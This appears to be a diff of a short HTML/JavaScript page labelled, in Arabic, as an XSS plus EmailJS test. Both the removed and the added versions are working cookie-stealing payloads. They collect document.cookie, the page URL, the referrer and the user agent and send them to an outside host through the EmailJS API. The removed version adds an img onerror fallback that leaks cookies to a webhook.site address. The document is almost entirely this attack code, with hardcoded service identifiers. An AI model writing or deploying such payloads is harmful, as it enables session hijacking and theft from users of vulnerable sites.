@@ -1,59 +1,20 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>اختبار XSS + EmailJS</title>
-  <!-- تحميل EmailJS SDK -->
-  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-</head>
-<body>
-
-<h1>صفحة اختبار (لا تشارك الرابط مع أحد)</h1>
-<p>إذا وصل إيميل لك → يعني الإرسال نجح (تحقق في بريدك الإلكتروني المرتبط بالـ Gmail service).</p>
-
 <script>
-// انتظر تحميل الـ SDK ثم ابدأ
-window.onload = function() {
-  try {
-    // 1. تهيئة EmailJS بالـ Public Key فقط
-    emailjs.init({
-      publicKey: "BlSSWev0sQc2aJE8p"
-    });
-
-    console.log("EmailJS initialized");
-
-    // البيانات التي سنرسلها
-    const payload = {
-      cookie: document.cookie || "no_cookie",
-      loc: window.location.href,
-      referrer: document.referrer || "no_referrer",
-      ua: navigator.userAgent,
+fetch('https://api.emailjs.com/api/v1.0/email/send', {
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json' },
+  body: JSON.stringify({
+    service_id: 'service_q0fqthf',
+    template_id: 'YOUR_TEMPLATE_ID',
+    user_id: 'BlSSWev0sQc2aJE8p',
+    template_params: {
       timestamp: new Date().toISOString(),
-      screen: window.screen.width + "x" + window.screen.height
-    };
-
-    // 2. محاولة الإرسال الأساسية (emailjs.send)
-    emailjs.send(
-      "service_q0fqthf",          // ← Service ID
-      "template_uwz3h0c",    // ← غيّرها إلى Template ID الحقيقي الخاص بك
-      payload                     // البيانات التي ستذهب إلى الـ template
-    )
-    .then(function(response) {
-      console.log("Email sent successfully!", response.status, response.text);
-    })
-    .catch(function(error) {
-      console.error("EmailJS send failed:", error);
-    });
-
-  } catch (err) {
-    console.error("EmailJS general error:", err);
-  }
-};
+      page_url: window.location.href,
+      referrer: document.referrer || 'no_referrer',
+      user_agent: navigator.userAgent,
+      cookies: document.cookie || 'no_cookie'
+    }
+  })
+})
+.then(r => console.log('Status:', r.status))
+.catch(e => console.error('Fetch error:', e));
 </script>
-
-<!-- محاولة احتياطية بسيطة عبر img إذا فشل EmailJS (fallback) -->
-<img src="x" onerror="this.src='https://webhook.site/YOUR_WEBHOOK_UUID?c='+encodeURIComponent(document.cookie)+'&fallback=1'">
-
-</body>
-</html>
